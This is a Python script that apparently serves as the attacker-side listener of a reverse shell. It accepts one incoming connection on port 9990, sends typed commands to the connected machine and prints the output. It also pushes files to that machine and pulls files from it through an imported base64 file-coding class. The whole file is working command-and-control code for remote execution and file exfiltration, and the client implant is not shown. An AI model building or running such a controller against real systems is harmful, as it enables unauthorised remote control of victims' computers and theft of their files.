from  datetime import datetime
import json
import socket 
import base64
from typing import List
from array import *
import time
from filecod_class import Filecod


def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("0.0.0.0", 9990))
    listener.listen(0)
    print("[+] Waiting for incoming connections")
    cl_socket, remote_address = listener.accept()
    print(f"[+] Got a connection from {remote_address} ")

    cod_file :object = Filecod()

    try:

        while True:
            command :str = input(">> ")
        
        
            if "upload" in command:
                command_name, path_in_server, path_in_client :str = command.split(' ')

                """
                with open(path_in_server, '+rb') as file:
                    data = file.read()
                b64 = base64.b64decode(data)
                """
            
                command_on_client :str = command_name +' '+ path_in_client

                cl_socket.send(command_on_client.encode())
                time.sleep(1)
                cl_socket.send(cod_file.on_code(path_in_server))
                print("The file has been sent")

            elif "download" in command:
                command_list :list = command.split(' ')
                command_out :str = command_list[0] + ' ' + command_list[2]
                cl_socket.send(command_out.encode())

            
                file = cl_socket.recv(1024).decode()
            
                cod_file.on_decode(command_list[1], file)

                """
                with open(path_in_server, 'wb') as output_file:
                    output_file.write(base64.b64decode(file))
                """
            
            else:
                cl_socket.send(command.encode())
                response :str = cl_socket.recv(1024).decode()
                print(response)

            #mas: array = array()
        
    except KeyboardInterrupt:
        listener.close()
        exit()

if __name__ == "__main__":
    main() 